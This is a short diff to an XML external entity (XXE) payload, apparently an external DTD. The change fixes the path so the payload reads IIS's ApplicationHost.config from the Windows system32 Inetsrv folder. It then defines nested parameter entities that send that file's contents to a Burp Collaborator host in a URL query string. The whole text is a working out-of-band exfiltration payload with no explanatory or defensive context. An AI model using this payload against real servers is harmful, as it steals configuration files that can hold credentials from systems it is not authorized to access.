@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///windows/system32/Config/ApplicationHost.config">
+<!ENTITY % file SYSTEM "file:///windows/system32/Inetsrv/Config/ApplicationHost.config">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://pmfvbrml53mr65e3cvxpqzk8hznxbm.burpcollaborator.net/?x=%file;'>">
 %eval;
 %exfiltrate;
